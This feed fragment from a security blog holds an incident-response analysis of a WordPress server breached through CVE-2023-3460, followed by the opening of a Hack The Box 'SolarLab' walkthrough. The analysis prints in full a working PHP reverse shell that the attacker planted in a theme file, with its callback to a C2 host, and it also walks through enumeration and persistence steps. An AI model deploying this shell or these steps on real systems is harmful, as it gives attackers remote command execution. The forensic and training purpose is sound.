</span></span><span style="display:flex;"><span><span style="color:#ff79c6">-</span>rwxrwxrwx  <span style="color:#bd93f9">1</span> root root   <span style="color:#bd93f9">4990</span> Aug  <span style="color:#bd93f9">8</span>  <span style="color:#bd93f9">2023</span> ip<span style="color:#ff79c6">-</span><span style="color:#bd93f9">172</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">31</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">11</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">131</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">20230808</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">0937</span><span style="color:#ff79c6">-</span>etc<span style="color:#ff79c6">-</span>modified<span style="color:#ff79c6">-</span>files<span style="color:#ff79c6">-</span>list<span style="color:#ff79c6">.</span>txt
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">-</span>rwxrwxrwx  <span style="color:#bd93f9">1</span> root root     <span style="color:#bd93f9">38</span> Aug  <span style="color:#bd93f9">8</span>  <span style="color:#bd93f9">2023</span> ip<span style="color:#ff79c6">-</span><span style="color:#bd93f9">172</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">31</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">11</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">131</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">20230808</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">0937</span><span style="color:#ff79c6">-</span>host<span style="color:#ff79c6">-</span>date<span style="color:#ff79c6">-</span>timezone<span style="color:#ff79c6">.</span>txt
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">-</span>rwxrwxrwx  <span style="color:#bd93f9">1</span> root root   <span style="color:#bd93f9">1863</span> Aug  <span style="color:#bd93f9">8</span>  <span style="color:#bd93f9">2023</span> ip<span style="color:#ff79c6">-</span><span style="color:#bd93f9">172</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">31</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">11</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">131</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">20230808</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">0937</span><span style="color:#ff79c6">-</span>lsmod<span style="color:#ff79c6">.</span>txt
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">-</span>rwxrwxrwx  <span style="color:#bd93f9">1</span> root root      <span style="color:#bd93f9">0</span> Aug  <span style="color:#bd93f9">8</span>  <span style="color:#bd93f9">2023</span> ip<span style="color:#ff79c6">-</span><span style="color:#bd93f9">172</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">31</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">11</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">131</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">20230808</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">0937</span><span style="color:#ff79c6">-</span>lsusb<span style="color:#ff79c6">.</span>txt
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">-</span>rwxrwxrwx  <span style="color:#bd93f9">1</span> root root   <span style="color:#bd93f9">1391</span> Aug  <span style="color:#bd93f9">8</span>  <span style="color:#bd93f9">2023</span> ip<span style="color:#ff79c6">-</span><span style="color:#bd93f9">172</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">31</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">11</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">131</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">20230808</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">0937</span><span style="color:#ff79c6">-</span>meminfo<span style="color:#ff79c6">.</span>txt
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">-</span>rwxrwxrwx  <span style="color:#bd93f9">1</span> root root <span style="color:#bd93f9">112329</span> Aug  <span style="color:#bd93f9">8</span>  <span style="color:#bd93f9">2023</span> ip<span style="color:#ff79c6">-</span><span style="color:#bd93f9">172</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">31</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">11</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">131</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">20230808</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">0937</span><span style="color:#ff79c6">-</span>modinfo<span style="color:#ff79c6">.</span>txt
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">-</span>rwxrwxrwx  <span style="color:#bd93f9">1</span> root root   <span style="color:#bd93f9">5151</span> Aug  <span style="color:#bd93f9">8</span>  <span style="color:#bd93f9">2023</span> ip<span style="color:#ff79c6">-</span><span style="color:#bd93f9">172</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">31</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">11</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">131</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">20230808</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">0937</span><span style="color:#ff79c6">-</span>module<span style="color:#ff79c6">-</span>sha1<span style="color:#ff79c6">.</span>txt
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">-</span>rwxrwxrwx  <span style="color:#bd93f9">1</span> root root   <span style="color:#bd93f9">4348</span> Aug  <span style="color:#bd93f9">8</span>  <span style="color:#bd93f9">2023</span> ip<span style="color:#ff79c6">-</span><span style="color:#bd93f9">172</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">31</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">11</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">131</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">20230808</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">0937</span><span style="color:#ff79c6">-</span>mount<span style="color:#ff79c6">.</span>txt
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">-</span>rwxrwxrwx  <span style="color:#bd93f9">1</span> root root   <span style="color:#bd93f9">2446</span> Aug  <span style="color:#bd93f9">8</span>  <span style="color:#bd93f9">2023</span> ip<span style="color:#ff79c6">-</span><span style="color:#bd93f9">172</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">31</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">11</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">131</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">20230808</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">0937</span><span style="color:#ff79c6">-</span>procmod<span style="color:#ff79c6">.</span>txt
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">-</span>rwxrwxrwx  <span style="color:#bd93f9">1</span> root root    <span style="color:#bd93f9">526</span> Aug  <span style="color:#bd93f9">8</span>  <span style="color:#bd93f9">2023</span> ip<span style="color:#ff79c6">-</span><span style="color:#bd93f9">172</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">31</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">11</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">131</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">20230808</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">0937</span><span style="color:#ff79c6">-</span>release<span style="color:#ff79c6">.</span>txt
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">-</span>rwxrwxrwx  <span style="color:#bd93f9">1</span> root root   <span style="color:#bd93f9">4570</span> Aug  <span style="color:#bd93f9">8</span>  <span style="color:#bd93f9">2023</span> ip<span style="color:#ff79c6">-</span><span style="color:#bd93f9">172</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">31</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">11</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">131</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">20230808</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">0937</span><span style="color:#ff79c6">-</span>sudo<span style="color:#ff79c6">.</span>txt
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>User_Files:
</span></span><span style="display:flex;"><span>total <span style="color:#bd93f9">8</span>
</span></span><span style="display:flex;"><span>drwxrwxrwx <span style="color:#bd93f9">5</span> root root <span style="color:#bd93f9">4096</span> May <span style="color:#bd93f9">27</span> <span style="color:#bd93f9">10</span>:<span style="color:#bd93f9">10</span> hidden<span style="color:#ff79c6">-</span>user<span style="color:#ff79c6">-</span>home<span style="color:#ff79c6">-</span>dir
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">-</span>rwxrwxrwx <span style="color:#bd93f9">1</span> root root  <span style="color:#bd93f9">315</span> Aug  <span style="color:#bd93f9">8</span>  <span style="color:#bd93f9">2023</span> hidden<span style="color:#ff79c6">-</span>user<span style="color:#ff79c6">-</span>home<span style="color:#ff79c6">-</span>dir<span style="color:#ff79c6">-</span>list<span style="color:#ff79c6">.</span>txt
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Virsh:
</span></span><span style="display:flex;"><span>total <span style="color:#bd93f9">0</span>
</span></span></code></pre></div><h3 id="tools">Tools</h3>
<ul>
<li>Visual Studio Code</li>
<li>Sublime Text Editor</li>
<li><a href="https://github.com/WithSecureLabs/LinuxCatScale">LinuxCatScale</a> to extract the archive.</li>
</ul>
<h3 id="analysis">Analysis</h3>
<p>The web server was <code>Apache v2.4.41-4ubuntu3.14</code> and it was running <code>WordPress v6.2.2</code> on <code>Ubuntu 20.04.6 LTS (Focal Fossa)</code> with a kernel version of <code>5.15.0-1036-aws</code>.</p>
<p>The server was triaged and we were provided artifacts following the <code>acquisition playbook</code>. Because this was an attack on the webserver most of the analysis for <strong>Initial Foothold</strong> will revolve around analyzing the <code>access.log</code>.</p>
<p>From the access log, we see a lot of HTTP requests coming in and out of the server from an IP <code>23.106.60.163</code> with the user agent <code>WPScan v3.8.24 (https://wpscan.com/wordpress-security-scanner)</code>. The TA used this IP to scan Forella&rsquo;s WordPress blog for vulnerabilities.</p>
<p><code>WPScanner</code> is an automated security auditing tool for WordPress. It scans the WordPress version and its plugins. themes and various other components to check for known vulnerabilities or weaknesses.</p>
<p>The log shows that the TA was successful in identifying a vulnerable plugin. It was <a href="https://ultimatemember.com/">Ultimate-Member - User Profile, Registration, Login, Member Directory, Content Restriction &amp; Membership Plugin</a>, the version that was installed on Forella&rsquo;s WordPress site was <code>v2.6.4</code>.</p>
<p>According to <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-3460">Mitre</a> - <em>The Ultimate Member WordPress plugin before 2.6.7 does not prevent visitors from creating user accounts with arbitrary capabilities, effectively allowing attackers to create administrator accounts at will. This is actively being exploited in the wild.</em> The CVE assigned was <code>CVE-2023-3460</code> with a CVSS (v3.x) base score of <code>9.8 CRITICAL</code>. The exploit for this CVE was publicly available at the time of the attack.</p>
<p>After identifying the vulnerability, the TA used a <a href="https://github.com/gbrsh/CVE-2023-3460">PoC published on GitHub</a> by a security research firm named <a href="https://secragon.com/">Secragon</a>. It was confirmed by analyzing the script&rsquo;s User Agents which were <code>python-requests/2.28.1</code> and <code>Secragon Offensive Agen</code>.</p>
<p>Therefore, successfully creating an admin user named <code>secragon</code> the TA switched his IP to <code>198.16.74.45</code> and manually browsed the admin dashboard. We can confirm this by their User Agent <code>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0</code>.</p>
<p>To get a foothold on the server the TA created a malicious theme, which served as a reverse shell to perform Remote Command Execution. They created the file here <code>/var/www/html/wp-content/themes/twentytwentythree/patterns/hidden-comments.php</code>. The code for the reverse shell is below.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>&lt;?php
</span></span><span style="display:flex;"><span>// php-reverse-shell - A Reverse Shell implementation in PHP. Comments stripped to slim it down. RE: https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
</span></span><span style="display:flex;"><span>// Copyright (C) 2007 pentestmonkey@pentestmonkey.net
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>set_time_limit (0);
</span></span><span style="display:flex;"><span>$VERSION = &#34;1.0&#34;;
</span></span><span style="display:flex;"><span>$ip = &#39;43.204.24.76&#39;;
</span></span><span style="display:flex;"><span>$port = 6969;
</span></span><span style="display:flex;"><span>$chunk_size = 1400;
</span></span><span style="display:flex;"><span>$write_a = null;
</span></span><span style="display:flex;"><span>$error_a = null;
</span></span><span style="display:flex;"><span>$shell = &#39;uname -a; w; id; /bin/bash -i&#39;;
</span></span><span style="display:flex;"><span>$daemon = 0;
</span></span><span style="display:flex;"><span>$debug = 0;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>if (function_exists(&#39;pcntl_fork&#39;)) {
</span></span><span style="display:flex;"><span>	$pid = pcntl_fork();
</span></span><span style="display:flex;"><span>	
</span></span><span style="display:flex;"><span>	if ($pid == -1) {
</span></span><span style="display:flex;"><span>		printit(&#34;ERROR: Can&#39;t fork&#34;);
</span></span><span style="display:flex;"><span>		exit(1);
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	
</span></span><span style="display:flex;"><span>	if ($pid) {
</span></span><span style="display:flex;"><span>		exit(0);  // Parent exits
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	if (posix_setsid() == -1) {
</span></span><span style="display:flex;"><span>		printit(&#34;Error: Can&#39;t setsid()&#34;);
</span></span><span style="display:flex;"><span>		exit(1);
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	$daemon = 1;
</span></span><span style="display:flex;"><span>} else {
</span></span><span style="display:flex;"><span>	printit(&#34;WARNING: Failed to daemonise.  This is quite common and not fatal.&#34;);
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>chdir(&#34;/&#34;);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>umask(0);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>// Open reverse connection
</span></span><span style="display:flex;"><span>$sock = fsockopen($ip, $port, $errno, $errstr, 30);
</span></span><span style="display:flex;"><span>if (!$sock) {
</span></span><span style="display:flex;"><span>	printit(&#34;$errstr ($errno)&#34;);
</span></span><span style="display:flex;"><span>	exit(1);
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>$descriptorspec = array(
</span></span><span style="display:flex;"><span>   0 =&gt; array(&#34;pipe&#34;, &#34;r&#34;),  // stdin is a pipe that the child will read from
</span></span><span style="display:flex;"><span>   1 =&gt; array(&#34;pipe&#34;, &#34;w&#34;),  // stdout is a pipe that the child will write to
</span></span><span style="display:flex;"><span>   2 =&gt; array(&#34;pipe&#34;, &#34;w&#34;)   // stderr is a pipe that the child will write to
</span></span><span style="display:flex;"><span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>$process = proc_open($shell, $descriptorspec, $pipes);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>if (!is_resource($process)) {
</span></span><span style="display:flex;"><span>	printit(&#34;ERROR: Can&#39;t spawn shell&#34;);
</span></span><span style="display:flex;"><span>	exit(1);
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>stream_set_blocking($pipes[0], 0);
</span></span><span style="display:flex;"><span>stream_set_blocking($pipes[1], 0);
</span></span><span style="display:flex;"><span>stream_set_blocking($pipes[2], 0);
</span></span><span style="display:flex;"><span>stream_set_blocking($sock, 0);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>printit(&#34;Successfully opened reverse shell to $ip:$port&#34;);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>while (1) {
</span></span><span style="display:flex;"><span>	if (feof($sock)) {
</span></span><span style="display:flex;"><span>		printit(&#34;ERROR: Shell connection terminated&#34;);
</span></span><span style="display:flex;"><span>		break;
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	if (feof($pipes[1])) {
</span></span><span style="display:flex;"><span>		printit(&#34;ERROR: Shell process terminated&#34;);
</span></span><span style="display:flex;"><span>		break;
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	$read_a = array($sock, $pipes[1], $pipes[2]);
</span></span><span style="display:flex;"><span>	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	if (in_array($sock, $read_a)) {
</span></span><span style="display:flex;"><span>		if ($debug) printit(&#34;SOCK READ&#34;);
</span></span><span style="display:flex;"><span>		$input = fread($sock, $chunk_size);
</span></span><span style="display:flex;"><span>		if ($debug) printit(&#34;SOCK: $input&#34;);
</span></span><span style="display:flex;"><span>		fwrite($pipes[0], $input);
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	if (in_array($pipes[1], $read_a)) {
</span></span><span style="display:flex;"><span>		if ($debug) printit(&#34;STDOUT READ&#34;);
</span></span><span style="display:flex;"><span>		$input = fread($pipes[1], $chunk_size);
</span></span><span style="display:flex;"><span>		if ($debug) printit(&#34;STDOUT: $input&#34;);
</span></span><span style="display:flex;"><span>		fwrite($sock, $input);
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	if (in_array($pipes[2], $read_a)) {
</span></span><span style="display:flex;"><span>		if ($debug) printit(&#34;STDERR READ&#34;);
</span></span><span style="display:flex;"><span>		$input = fread($pipes[2], $chunk_size);
</span></span><span style="display:flex;"><span>		if ($debug) printit(&#34;STDERR: $input&#34;);
</span></span><span style="display:flex;"><span>		fwrite($sock, $input);
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>fclose($sock);
</span></span><span style="display:flex;"><span>fclose($pipes[0]);
</span></span><span style="display:flex;"><span>fclose($pipes[1]);
</span></span><span style="display:flex;"><span>fclose($pipes[2]);
</span></span><span style="display:flex;"><span>proc_close($process);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>function printit ($string) {
</span></span><span style="display:flex;"><span>	if (!$daemon) {
</span></span><span style="display:flex;"><span>		print &#34;$string\n&#34;;
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>?&gt;
</span></span></code></pre></div><p>From this code we can see the C2 server <code>43.204.24.76:6969</code> and the command <code>uname -a; w; id; /bin/bash -i</code> the web shell executed on behalf of the TA. First, the web shell created a process with PID <code>234471</code> to execute the shell&rsquo;s payload. Then for <code>/bin/bash -i</code> command it created an interactive bash shell with the PID <code>234517</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>www-data  234517  234471   2616   596 ?        S    09:01 00:00:00 sh -c uname -a; w; id; /bin/bash -i
</span></span><span style="display:flex;"><span>www-data  234521  234517   4248  3444 ?        S    09:01 00:00:00 /bin/bash -i
</span></span></code></pre></div><p>To elevate the shell&rsquo;s privilege the attacker used a bash script <code>LinEnum.sh</code> to enumerate potential privilege escalation vectors. The TA uploaded <code>LinEnum.sh</code> to <code>/tmp</code> and then <code>/dev/shm</code> directory.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>7,1,/dev/shm/LinEnum.sh,2023-08-08 09:33:05.917203555 +0000,2023-08-08 09:32:38.650234799 +0000,2023-08-08 09:32:46.345943752 +0000,-,www-data,www-data,-rwxrwxrwx,46631
</span></span></code></pre></div><p>And they were successful in gaining root access. From the <code>auth.log</code> we see that the TA logged into SSH using <code>ubuntu</code> user&rsquo;s private SSH key using another IP <code>203.101.190.9</code>. Then escalate their privilege to <code>root</code> using su.</p>
<p>Immediately after that, the threat actor created an account <code>cyberjunkie_admin</code> for persistence.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>Aug  7 13:50:25 ip-172-31-11-131 sshd[229515]: Accepted publickey for ubuntu from 203.101.190.9 port 42564 ssh2: RSA SHA256:c/25gw2HCe4yy/6f4eAd5O1dvdGebtUFKOEVAh7kmzk
</span></span><span style="display:flex;"><span>Aug  7 13:50:25 ip-172-31-11-131 sshd[229515]: pam_unix(sshd:session): session opened for user ubuntu by (uid=0)
</span></span><span style="display:flex;"><span>Aug  7 13:50:25 ip-172-31-11-131 systemd-logind[523]: New session 1971 of user ubuntu.
</span></span><span style="display:flex;"><span>Aug  7 13:50:31 ip-172-31-11-131 sudo:   ubuntu : TTY=pts/0 ; PWD=/home/ubuntu ; USER=root ; COMMAND=/usr/bin/su
</span></span><span style="display:flex;"><span>Aug  7 13:50:31 ip-172-31-11-131 sudo: pam_unix(sudo:session): session opened for user root by ubuntu(uid=0)
</span></span><span style="display:flex;"><span>Aug  7 13:50:31 ip-172-31-11-131 su: (to root) ubuntu on pts/0
</span></span><span style="display:flex;"><span>Aug  7 13:50:31 ip-172-31-11-131 su: pam_unix(su:session): session opened for user root by ubuntu(uid=0)
</span></span><span style="display:flex;"><span>Aug  7 13:53:08 ip-172-31-11-131 sshd[126847]: Received SIGHUP; restarting.
</span></span><span style="display:flex;"><span>Aug  7 13:53:08 ip-172-31-11-131 sshd[126847]: Server listening on 0.0.0.0 port 22.
</span></span><span style="display:flex;"><span>Aug  7 13:53:08 ip-172-31-11-131 sshd[126847]: Server listening on :: port 22.
</span></span><span style="display:flex;"><span>Aug  7 13:55:36 ip-172-31-11-131 groupadd[229659]: group added to /etc/group: name=cyberjunkie_admin, GID=1001
</span></span><span style="display:flex;"><span>Aug  7 13:55:36 ip-172-31-11-131 groupadd[229659]: group added to /etc/gshadow: name=cyberjunkie_admin
</span></span><span style="display:flex;"><span>Aug  7 13:55:36 ip-172-31-11-131 groupadd[229659]: new group: name=cyberjunkie_admin, GID=1001
</span></span><span style="display:flex;"><span>Aug  7 13:55:36 ip-172-31-11-131 useradd[229665]: new user: name=cyberjunkie_admin, UID=1001, GID=1001, home=/home/cyberjunkie_admin, shell=/bin/bash, from=/dev/pts/0
</span></span><span style="display:flex;"><span>Aug  7 13:55:58 ip-172-31-11-131 passwd[229677]: pam_unix(passwd:chauthtok): password changed for cyberjunkie_admin
</span></span><span style="display:flex;"><span>Aug  7 13:56:18 ip-172-31-11-131 chfn[229679]: changed user &#39;cyberjunkie_admin&#39; information
</span></span><span style="display:flex;"><span>Aug  7 13:59:25 ip-172-31-11-131 su: (to cyberjunkie_admin) ubuntu on pts/0
</span></span><span style="display:flex;"><span>Aug  7 13:59:25 ip-172-31-11-131 su: pam_unix(su:session): session opened for user cyberjunkie_admin by ubuntu(uid=0)
</span></span></code></pre></div><p>Closely examining the sudoers permission file we found a <code>very risky configuration</code> that allowed the <code>ubuntu</code> user to perform tasks as <code>root</code> without authentication.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span># Created by cloud-init v. 23.1.2-0ubuntu0~20.04.1 on Wed, 12 Jul 2023 11:41:45 +0000
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span># User rules for ubuntu
</span></span><span style="display:flex;"><span>ubuntu ALL=(ALL) NOPASSWD:ALL
</span></span></code></pre></div><h2 id="timeline">Timeline</h2>
<ul>
<li>
<p><strong>Reconnaissance:</strong> On <code>2023-08-08 08:21:27</code> the TA started the scanner using IP <code>23.106.60.163</code>.</p>
</li>
<li>
<p><strong>Weaponization &amp; Delivery:</strong> On <code>2023-08-08 08:32:50</code> The TA identified the vulnerable WordPress plugin <code>Ultimate Member v2.6.4</code>.</p>
</li>
<li>
<p><strong>Exploitation:</strong> On <code>2023-08-08 08:33:58</code> the TA successfully exploited CVE-2023-3460 and added an Admin user <code>secragon</code>.</p>
</li>
<li>
<p><strong>Installation:</strong> On <code>2023-08-08 08:58:02</code> the TA created a reverse web shell <code>/var/www/html/wp-content/themes/twentytwentythree/patterns/hidden-comments.php</code>. The TA did this from an IP <code>198.16.74.45</code>. After that, on <code>2023-08-08 09:06:53</code> the TA uploaded a Bash Script <code>LinEnum.sh</code> inside the <code>/tmp</code> folder then he moved it to the <code>/dev/shm</code> on <code>2023-08-08 09:32:38</code>.</p>
</li>
<li>
<p><strong>Command and Control:</strong> The TA used IP <code>43.204.24.76</code> and port <code>6969</code> as a C2 server.</p>
</li>
</ul>
<h2 id="remarks">Remarks</h2>
<p>Analyzing the log file indicates that the server was already compromised on <code>2023-08-07 13:50:25</code> by another threat actor who logged into the SSH account of <code>ubuntu</code> user from IP <code>203.101.190.9</code> using SSH key and created a backdoor admin account <code>cyberjunkie_admin</code> on <code>2023-08-07 13:55:36</code>. The account seems to be dormant but that TA (<code>203.101.190.9</code>) also compromised the MySQL Database.</p>
]]></description></item><item><title>HTB Machine Solarlab</title><link>https://hshakilst.github.io/posts/htb-machines/solarlab/</link><pubDate>Thu, 16 May 2024 18:00:05 +0200</pubDate><guid>https://hshakilst.github.io/posts/htb-machines/solarlab/</guid><description><![CDATA[<h1 id="solar-lab---htbhttpsapphacktheboxcommachinessolarlab">Solar Lab - <a href="https://app.hackthebox.com/machines/SolarLab">HTB</a></h1>
<p><img src="images/image.png" alt="alt text"></p>
<h2 id="nmap">Nmap</h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>PORT     STATE SERVICE       REASON  VERSION
</span></span><span style="display:flex;"><span>80/tcp   open  http          syn-ack nginx 1.24.0
</span></span><span style="display:flex;"><span>| http-methods: 
</span></span><span style="display:flex;"><span>|_  Supported Methods: GET HEAD
</span></span><span style="display:flex;"><span>|_http-title: SolarLab Instant Messenger
</span></span><span style="display:flex;"><span>|_http-server-header: nginx/1.24.0
</span></span><span style="display:flex;"><span>135/tcp  open  msrpc         syn-ack Microsoft Windows RPC
</span></span><span style="display:flex;"><span>139/tcp  open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn
</span></span><span style="display:flex;"><span>445/tcp  open  microsoft-ds? syn-ack
</span></span><span style="display:flex;"><span>6791/tcp open  http          syn-ack nginx 1.24.0
</span></span><span style="display:flex;"><span>| http-methods: 
</span></span><span style="display:flex;"><span>|_  Supported Methods: GET HEAD POST OPTIONS
</span></span><span style="display:flex;"><span>|_http-server-header: nginx/1.24.0
</span></span><span style="display:flex;"><span>|_http-title: Did not follow redirect to http://report.solarlab.htb:6791/
</span></span><span style="display:flex;"><span>Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Host script results:
</span></span><span style="display:flex;"><span>| smb2-time: 
</span></span><span style="display:flex;"><span>|   date: 2024-05-14T14:01:13
</span></span><span style="display:flex;"><span>|_  start_date: N/A
</span></span><span style="display:flex;"><span>|_clock-skew: -5m11s
</span></span><span style="display:flex;"><span>| smb2-security-mode: 
</span></span><span style="display:flex;"><span>|   3:1:1: 
</span></span><span style="display:flex;"><span>|_    Message signing enabled but not required
</span></span><span style="display:flex;"><span>| p2p-conficker: 
</span></span><span style="display:flex;"><span>|   Checking for Conficker.C or higher...
</span></span><span style="display:flex;"><span>|   Check 1 (port 64857/tcp): CLEAN (Timeout)
</span></span><span style="display:flex;"><span>|   Check 2 (port 37138/tcp): CLEAN (Timeout)
</span></span><span style="display:flex;"><span>|   Check 3 (port 48381/udp): CLEAN (Timeout)
</span></span><span style="display:flex;"><span>|   Check 4 (port 52237/udp): CLEAN (Timeout)
</span></span><span style="display:flex;"><span>|_  0/4 checks are positive: Host is CLEAN or ports are blocked
</span></span></code></pre></div><h2 id="http-enumeration">HTTP Enumeration</h2>
<p><strong><a href="http://report.solarlab.htb:6791">http://report.solarlab.htb:6791</a></strong></p>
<p><img src="images/report_portal.png" alt="Login Portal"></p>
<p>Unfortunately couldn&rsquo;t log in, no credential was available.</p>
<h2 id="smb-enumeration">SMB Enumeration</h2>
<p>Message signing enabled but not required.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>$ smbclient --no-pass -L //10.10.11.16    
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	Sharename       Type      Comment
</span></span><span style="display:flex;"><span>	---------       ----      -------
</span></span><span style="display:flex;"><span>	ADMIN$          Disk      Remote Admin
</span></span><span style="display:flex;"><span>	C$              Disk      Default share
</span></span><span style="display:flex;"><span>	Documents       Disk      
</span></span><span style="display:flex;"><span>	IPC$            IPC       Remote IPC
</span></span></code></pre></div><p><code>Documents</code> share was interesting so let&rsquo;s connect and list the contents of it.</p>
